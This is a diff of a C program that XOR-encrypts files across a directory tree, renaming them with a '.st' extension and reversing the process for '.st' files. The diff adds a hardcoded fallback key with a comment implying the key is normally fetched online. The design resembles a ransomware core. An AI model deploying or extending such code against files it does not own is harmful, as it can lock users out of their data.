@@ -36,7 +36,7 @@ char* remext(const char* input){
   return output;
 }
 
-int docrypt(FILE* in, FILE* out, char* key, char (*cyph)(char,char*,int*)){
+int docrypt(FILE* in, FILE* out, const char* key, char (*cyph)(char, const char*,int*)){
   char c;
   int i = 0;
   while((c = fgetc(in))!= EOF){
@@ -46,21 +46,27 @@ int docrypt(FILE* in, FILE* out, char* key, char (*cyph)(char,char*,int*)){
   return 0;
 }
 
-char enc(char c, char* key, int* i){
-  char buff = c^key[*i%strlen(key)];
+char* getKey(){
+  // if online code doesn't work
+  char* key = "[}TiS@K|oEL;/+=]*$";
+  return key;
+}
+
+char enc(char c, const char* key, int* i){
+  char buff = c^(key[*i%strlen(key)]-1);
   buff += 1;
   *i+=1;
   return buff;
 }
 
-char dec(char c, char* key, int* i){
+char dec(char c, const char* key, int* i){
   char buff = c-1;
-  buff ^= key[*i%strlen(key)];
+  buff ^= key[*i%strlen(key)]-1;
   *i+=1;
   return buff;
 }
 
-int processFile(char* path){
+int processFile(char* path, const char* key){
   // if extension .st then decrypt the file
   int todo = strstr(path, ".st") ? 1:0;
   char* outputPath = todo == 1 ? remext(path):addext(path, ".st");
@@ -69,8 +75,7 @@ int processFile(char* path){
   FILE* output = openFile(outputPath, "w");
   free(outputPath);
 
-  char (*cypher[])(char,char*,int*) = {enc, dec};
-  char* key = "ThisIsMyKey";
+  char (*cypher[])(char, const char*,int*) = {enc, dec};
   docrypt(input, output, key, cypher[todo]);
   
   closeFile(input,output);
@@ -106,7 +111,7 @@ int isDir(char* path){
   }
 }
 
-int encDir(char* path){
+int encDir(char* path, const char* key){
   DIR *dir = opendir(path);
   if (dir == NULL){
     perror(path);
@@ -118,9 +123,9 @@ int encDir(char* path){
     if(strcmp(file->d_name,".")!=0 && strcmp(file->d_name,"..")!=0){
       char* fullpath = addPath(path, file->d_name);
       if(isDir(fullpath)){
-        encDir(fullpath);
+        encDir(fullpath, key);
       }else{
-        processFile(fullpath) == 0 ? 0:printf("Error : %s\n",fullpath);
+        processFile(fullpath, key) == 0 ? 0:printf("Error : %s\n",fullpath);
       }
       free(fullpath);
     }
